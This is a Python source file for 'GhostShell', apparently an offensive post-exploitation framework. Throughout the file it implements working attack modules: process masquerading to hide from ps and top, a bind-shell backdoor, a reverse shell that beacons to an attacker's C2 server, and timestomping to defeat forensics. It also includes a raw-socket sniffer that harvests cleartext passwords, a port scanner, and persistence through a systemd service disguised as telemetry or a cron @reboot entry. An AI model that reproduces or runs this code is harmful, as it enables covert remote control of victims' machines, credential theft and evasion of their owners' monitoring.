import typer
import sys
import socket
import threading
import os
import time
import subprocess
import setproctitle 
from typing import List, Optional
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel
import concurrent.futures
import platform
import struct
import hashlib
import re

app = typer.Typer(help="GhostShell - Post-Exploitation & OS Manipulation Framework")
console = Console()

# --- UTILITIES ---

def activate_ghost(name: str):
    """Renames the process in system memory."""
    # Cron/Background safety: Skip animations if no terminal
    if not sys.stdout.isatty():
        try:
            setproctitle.setproctitle(name)
        except:
            pass
        return

    with console.status(f"[bold green]Masquerading as '{name}'...[/bold green]", spinner="dots"):
        time.sleep(1)
        setproctitle.setproctitle(name)
    console.print(f"[green]✔[/green] Process ID {os.getpid()} is now hidden as [cyan]{name}[/cyan]")

def execute_command(cmd):
    """Executes system commands and returns output, handling directory persistence."""
    cmd = cmd.strip()
    
    # Optimization: Native handling for 'cd'
    if cmd.startswith("cd "):
        try:
            target_dir = cmd[3:].strip()
            os.chdir(target_dir)
            return f"Changed directory to {os.getcwd()}".encode()
        except FileNotFoundError:
            return b"Error: Directory not found"
        except Exception as e:
            return str(e).encode()

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = str(e.output).encode()
    except Exception as e:
        output = str(e).encode()
    return output

# --- MODULE 1: GHOST MODE (Evasion Only) ---

@app.command()
def ghost(name: str = typer.Option("kworker/u4:0", help="Fake process name")):
    """
    [DEFENSE EVASION] Process Masquerading. 
    
    Activates the Process Masquerading technique.
    Under the hood: It doesn't just change the window title; it directly accesses process memory and overwrites command-line arguments (argv).
    Result: Deceives standard monitoring tools (ps, top, htop).
    """
    console.print(Panel.fit(f"GHOST PROTOCOL ACTIVATED\nIdentity: {name}", style="red"))
    activate_ghost(name)
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]Ghost mode deactivated.[/yellow]")

# --- MODULE 2: BIND SHELL (Persistence) ---

def handle_bind_client(client_socket):
    client_socket.send(b"\n=== GHOST BIND SHELL ===\n#> ")
    while True:
        try:
            cmd = client_socket.recv(1024).decode().strip()
            if cmd.lower() in ['exit', 'quit']: break
            if not cmd: continue
            output = execute_command(cmd)
            client_socket.send(output + b"\n#> ")
        except: break
    client_socket.close()

@app.command()
def listen(
    port: int = typer.Option(4444, help="Local port to listen on"),
    name: str = typer.Option("systemd-resolved", help="Fake process name")
):
    """
    [PERSISTENCE] Bind Shell.
    
    Opens a backdoor on the victim's system.
    Under the hood: Creates a server socket listening on 0.0.0.0.
    Limitation: Easily detectable and often blocked by inbound firewall rules.
    """
    activate_ghost(name)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", port))
    server.listen(5)
    console.print(f"[yellow]Listening on port {port}...[/yellow]")
    
    while True:
        client, addr = server.accept()
        console.print(f"[green]Connection received from {addr}[/green]")
        threading.Thread(target=handle_bind_client, args=(client,)).start()

# --- MODULE 3: REVERSE SHELL (C2 Beaconing) ---

@app.command()
def connect(
    ip: str = typer.Argument(..., help="Attacker's IP (C2 Server)"),
    port: int = typer.Option(4444, help="Attacker's Port"),
    name: str = typer.Option("chrome-extension-helper", help="Fake name (browser recommended)")
):
    """
    [C2 BEACONING] Reverse Shell.
    
    Initiates a connection FROM the victim TO the attacker.
    Under the hood: Simulates a web client accessing the internet.
    Strategic Advantage: Bypasses most corporate firewalls because outbound traffic is usually allowed.
    """
    console.print(Panel(f"Connecting to C2 Server {ip}:{port}", title="Reverse Shell", style="bold red"))
    activate_ghost(name)
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            console.print("[dim]Attempting to connect...[/dim]")
            s.connect((ip, port))
            console.print("[green]Connected to Attacker's C2![/green]")
            
            # Send victim info
            s.send(f"Connected from {socket.gethostname()} as {name}\n#> ".encode())
            
            while True:
                data = s.recv(1024)
                if not data: break
                
                cmd = data.decode().strip()
                if cmd.lower() == 'exit': break
                
                if cmd:
                    output = execute_command(cmd)
                    s.send(output + b"\n#> ")
                else:
                    s.send(b"#> ")
            s.close()
        except Exception as e:
            console.print(f"[red]Connection failed: {e}. Retrying in 5s...[/red]")
            time.sleep(5)

# --- MODULE 4: SCANNER (Reconnaissance) ---

def scan_port(target, port, open_ports):
    """Helper function to scan a single port."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
        s.close()
    except:
        pass

@app.command()
def scan(
    target: str = typer.Argument(..., help="Target IP or Domain"),
    ports: str = typer.Option("1-1000", help="Port range (e.g., 1-1000)"),
    threads: int = typer.Option(50, help="Number of concurrent threads")
):
    """
    [RECONNAISSANCE] Port Scanner.
    
    Scans for open ports on a remote target.
    Under the hood: Uses TCP Sockets (SOCK_STREAM) and Multi-threading to verify hundreds of ports simultaneously.
    Result: Identifies vulnerable services on the network.
    """
    console.print(Panel(f"Scanning {target} ports {ports}...", title="Network Scanner", style="bold blue"))
    
    # Parse port range
    try:
        start_port, end_port = map(int, ports.split('-'))
    except ValueError:
        console.print("[red]Invalid port range format. Use 'start-end' (e.g., 1-1000).[/red]")
        return

    try:
        target_ip = socket.gethostbyname(target)
    except socket.gaierror:
        console.print(f"[red]Could not resolve host: {target}[/red]")
        return
    
    open_ports = []
    start_time = time.time()
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        transient=True,
    ) as progress:
        task = progress.add_task(f"[green]Scanning {target} ({target_ip})...", total=end_port - start_port)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(scan_port, target_ip, port, open_ports): port for port in range(start_port, end_port + 1)}
            
            for future in concurrent.futures.as_completed(futures):
                pass
    
    end_time = time.time()
    duration = end_time - start_time
    
    # Display Results
    if open_ports:
        table = Table(title=f"Scan Report for {target} ({target_ip})")
        table.add_column("Port", style="cyan")
        table.add_column("Service", style="magenta")
        table.add_column("Status", style="green")
        
        for port in sorted(open_ports):
            try:
                service = socket.getservbyport(port, "tcp")
            except:
                service = "unknown"
                
            table.add_row(str(port), service.upper(), "OPEN")
        
        console.print(table)
        console.print(f"\n[bold green]✔[/bold green] Finished scanning {end_port - start_port + 1} ports in [yellow]{duration:.2f} seconds[/yellow].")
    else:
        console.print(f"[red]No open ports found in range {ports} after {duration:.2f}s[/red]")

# --- MODULE 5: AUDIT (Vulnerability Assessment) ---

@app.command()
def audit():
    """
    [PRIVILEGE ESCALATION] Kernel Audit.
    
    Quickly checks kernel security status.
    Under the hood: Compares the current kernel version (uname -r) with known critical vulnerability databases (e.g., Dirty Pipe - CVE-2022-0847).
    """
    console.print(Panel("Auditing Kernel Version...", title="System Audit", style="bold yellow"))
    
    kernel_version = platform.release()
    console.print(f"Current Kernel: [bold white]{kernel_version}[/bold white]")
    
    # Simplified logic for Dirty Pipe (CVE-2022-0847)
    # Affects kernel 5.8 to 5.16.11 / 5.15.25 / 5.10.102
    is_vulnerable = False
    if any(v in kernel_version for v in ["5.8", "5.10", "5.11", "5.12", "5.13", "5.14", "5.15"]):
        is_vulnerable = True 
        
    table = Table(title="Vulnerability Report")
    table.add_column("CVE", style="red")
    table.add_column("Name", style="white")
    table.add_column("Status", style="bold")
    
    if is_vulnerable:
        table.add_row("CVE-2022-0847", "Dirty Pipe", "[red]VULNERABLE[/red]")
        console.print(table)
        console.print("\n[bold red]CRITICAL:[/bold red] System is likely vulnerable to local privilege escalation.")
    else:
        table.add_row("CVE-2022-0847", "Dirty Pipe", "[green]Safe[/green]")
        console.print(table)
        console.print("\n[green]System appears safe from high-profile kernel exploits.[/green]")

# --- MODULE 6: TIMESTOMPING (Anti-Forensics) ---

@app.command()
def timestomp(
    target: str = typer.Argument(..., help="Path to the file to modify"),
    ref_file: str = typer.Option("/bin/bash", help="Reference file to copy timestamps FROM"),
    date: str = typer.Option(None, help="Manual date (YYYY-MM-DD or 'YYYY-MM-DD HH:MM')")
):
    """
    [ANTI-FORENSICS] File Timestamp Manipulation.
    
    Modifies the file's metadata. You can either copy from a system file OR set a manual date.
    
    Examples:
    1. Clone /bin/bash: python main.py timestomp malware.py
    2. Manual Date:     python main.py timestomp malware.py --date "2020-01-01"
    """
    console.print(Panel(f"Target: {target}", title="Timestomper", style="bold purple"))
    
    if not os.path.exists(target):
        console.print(f"[red]Error: Target file '{target}' not found.[/red]")
        return

    from datetime import datetime

    try:
        if date:
            # MANUAL MODE
            try:
                # Try full format with time
                dt_obj = datetime.strptime(date, "%Y-%m-%d %H:%M")
            except ValueError:
                try:
                    # Try just date (auto-set time to 00:00)
                    dt_obj = datetime.strptime(date, "%Y-%m-%d")
                except ValueError:
                    console.print("[red]Error: Invalid format! Use 'YYYY-MM-DD' or 'YYYY-MM-DD HH:MM'[/red]")
                    return
            
            # Convert to Unix Timestamp
            timestamp = dt_obj.timestamp()
            os.utime(target, (timestamp, timestamp))
            console.print(f"[yellow]Manual Mode:[/yellow] Setting timestamp to [bold]{date}[/bold]")
            
        else:
            # CLONE MODE (Default)
            if not os.path.exists(ref_file):
                console.print(f"[red]Error: Reference file '{ref_file}' not found.[/red]")
                return
            
            st = os.stat(ref_file)
            os.utime(target, (st.st_atime, st.st_mtime))
            console.print(f"[cyan]Clone Mode:[/cyan] Copied timestamps from {ref_file}")
        
        # Validation
        new_stat = os.stat(target)
        
        table = Table(title="Timestamp Update")
        table.add_column("Type", style="cyan")
        table.add_column("New Timestamp", style="green")
        
        table.add_row("Access Time", str(datetime.fromtimestamp(new_stat.st_atime)))
        table.add_row("Modify Time", str(datetime.fromtimestamp(new_stat.st_mtime)))
        
        console.print(table)
        console.print(f"\n[green]✔[/green] Operation successful!")
        
    except Exception as e:
        console.print(f"[red]Operation failed: {e}[/red]")

# --- MODULE 7: RAW SOCKET SNIFFER (Network Eavesdropping) ---

@app.command()
def sniff(
    interface: str = typer.Option("eth0", help="Network Interface to sniff on"),
    count: int = typer.Option(0, help="Number of packets to capture (0 = infinite)")
):
    """
    [NETWORK SPYING] Raw Socket Sniffer.
    
    Captures traffic in Promiscuous Mode looking for cleartext credentials.
    Under the hood: Uses socket.AF_PACKET to bypass the TCP/IP stack and read raw Ethernet frames.
    Targets: Telnet, FTP, HTTP (non-SSL) containing 'USER', 'PASS', 'LOGIN'.
    """
    console.print(Panel(f"Sniffing on {interface} for secrets...", title="Packet Sniffer", style="bold red"))
    
    if platform.system() != "Linux":
        console.print("[red]Error: Raw Sockets only work on Linux![/red]")
        return

    try:
        # Create a Raw Socket (ETH_P_ALL = 0x0003)
        conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
        conn.bind((interface, 0))
    except PermissionError:
        console.print("[red]Error: Root privileges required for Raw Sockets.[/red]")
        return
    except Exception as e:
        console.print(f"[red]Error initializing socket: {e}[/red]")
        return

    captured = 0
    last_payload_hash = "" # Deduplication

    try:
        while True:
            if count > 0 and captured >= count:
                break
                
            raw_data, addr = conn.recvfrom(65535)
            
            # 1. Parse Ethernet Header (First 14 bytes)
            dest_mac, src_mac, eth_proto = struct.unpack('! 6s 6s H', raw_data[:14])
            
            # Check if Protocol is IP (0x0800 = 8)
            if socket.ntohs(eth_proto) == 8:
                
                # 2. Parse IP Header (Next 20 bytes usually)
                ip_header = raw_data[14:34]
                iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
                protocol = iph[6] # TCP is 6
                
                # 3. Check for TCP
                if protocol == 6:
                    # Parse TCP Header to find Data Offset
                    # IP Header length is in the first byte (IHL), usually 20 bytes
                    version_ihl = iph[0]
                    ihl = version_ihl & 0xF
                    iph_length = ihl * 4
                    
                    tcp_header = raw_data[14+iph_length : 14+iph_length+20]
                    tcph = struct.unpack('!HHLLBBHHH', tcp_header)
                    
                    src_port = tcph[0]
                    dest_port = tcph[1]
                    
                    # Calculate Data Offset to find Payload
                    doff_reserved = tcph[4]
                    tcph_length = (doff_reserved >> 4) * 4
                    
                    header_size = 14 + iph_length + tcph_length
                    payload = raw_data[header_size:]
                    
                    # 4. Analyze Payload for Secrets
                    try:
                        # Decode and clean: keep only printable ASCII
                        decoded = payload.decode('utf-8', errors='ignore')
                        clean_text = "".join(char for char in decoded if char.isprintable() or char in ['\n', '\r'])
                        
                        keywords = ["USER", "PASS", "LOGIN", "PASSWORD", "ADMIN"]
                        
                        # Find lines containing keywords
                        for line in clean_text.splitlines():
                            if any(key in line.upper() for key in keywords) and len(line) < 200:
                                
                                # Smart Deduplication: Hash ONLY the credential line
                                line_hash = hashlib.md5(line.encode()).hexdigest()
                                if line_hash == last_payload_hash:
                                    continue
                                
                                last_payload_hash = line_hash
                                
                                console.print(f"\n[bold red]ALERT: Sensitive Data Found![/bold red]")
                                console.print(f"From: {socket.inet_ntoa(iph[8])}:{src_port} -> To: {socket.inet_ntoa(iph[9])}:{dest_port}")
                                console.print(Panel(line.strip(), style="yellow"))
                                captured += 1
                                break # Found one secret in packet, move to next to avoid spam
                    except:
                        pass

    except KeyboardInterrupt:
        console.print("\n[yellow]Sniffer stopped.[/yellow]")

# --- MODULE 8: PERSISTENCE (Maintaining Access) ---

@app.command()
def persist(
    method: str = typer.Option("systemd", help="Persistence method: 'systemd' or 'cron'"),
    payload: str = typer.Option("listen --port 4444", help="Command to run on startup"),
    name: str = typer.Option(None, help="Process name to masquerade as")
):
    """
    [PERSISTENCE] Automatic Startup.
    
    Ensures GhostShell starts automatically after a system reboot.
    Under the hood:
    - Systemd: Creates a background daemon service in /etc/systemd/system/.
    - Cron: Adds a @reboot entry to the crontab.
    """
    script_path = os.path.abspath(sys.argv[0])
    python_path = sys.executable
    
    # Inject name into payload if provided
    if name:
        payload += f' --name "{name}"'

    full_cmd = f"{python_path} {script_path} {payload}"
    
    console.print(Panel(f"Method: {method}\nPayload: {payload}", title="Persistence Engine", style="bold green"))

    if method == "systemd":
        service_content = f"""[Unit]
Description=System Telemetry Service
After=network.target

[Service]
Type=simple
ExecStart={full_cmd}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        service_path = "/etc/systemd/system/ghostshell.service"
        try:
            with open(service_path, "w") as f:
                f.write(service_content)
            
            # Reload systemd and enable
            os.system("systemctl daemon-reload")
            os.system("systemctl enable ghostshell.service")
            console.print(f"[green]✔[/green] Systemd service created at {service_path}")
            console.print("[dim]Service obfuscated as 'System Telemetry Service'[/dim]")
        except Exception as e:
            console.print(f"[red]Error creating Systemd service: {e}[/red]")
            console.print("[yellow]Note: Root privileges and systemd are required.[/yellow]")

    elif method == "cron":
        cron_entry = f"@reboot {full_cmd}\n"
        try:
            # Check if entry already exists
            current_cron = execute_command("crontab -l").decode().strip()

            # Fix: If 'crontab -l' returns error message, treat as empty
            if "no crontab" in current_cron or "command not found" in current_cron:
                current_cron = ""
            
            # Split lines to process them
            lines = current_cron.splitlines()
            new_lines = []
            updated = False
            
            # Filter out old GhostShell entries to allow overwrite
            for line in lines:
                # If the line contains our script path but NOT our exact new command, we skip it (remove old version)
                if script_path in line and "@reboot" in line:
                    continue # Remove old entry
                new_lines.append(line)
            
            # Add our new entry
            new_lines.append(cron_entry.strip())
            
            final_cron = "\n".join(new_lines) + "\n"

            with open("/tmp/cron_temp", "w") as f:
                f.write(final_cron)

            # Execute crontab update
            os.system("crontab /tmp/cron_temp")
            os.remove("/tmp/cron_temp")
            console.print(f"[green]✔[/green] Updated @reboot entry in Crontab (Overwritten old versions)")
            
        except Exception as e:
            console.print(f"[red]Error updating Crontab: {e}[/red]")
@app.command(hidden=True)
def simulate_boot():
    """(Docker Only) Manually triggers @reboot cron jobs to bypass kernel uptime check."""
    try:
        # Read crontab for current user
        crontab = subprocess.check_output("crontab -l", shell=True).decode()
        triggered = False
        for line in crontab.splitlines():
            if line.strip().startswith("@reboot"):
                # Remove @reboot prefix and execute
                cmd = line.replace("@reboot", "", 1).strip()
                console.print(f"[bold yellow][BOOT SIMULATION][/bold yellow] Triggering persistence: {cmd}")
                
                # Stealth execution: Use nohup and & to detach process completely from the parent shell
                # This ensures the intermediate /bin/sh process (PID 20) disappears, leaving only the ghost process.
                stealth_cmd = f"nohup {cmd} >/dev/null 2>&1 &"
                subprocess.Popen(stealth_cmd, shell=True)
                triggered = True
        
        if triggered:
            console.print("[green]✔ Boot sequence simulated successfully.[/green]")
    except Exception:
        # Silently fail if no crontab exists (normal for fresh containers)
        pass

if __name__ == "__main__":
    app()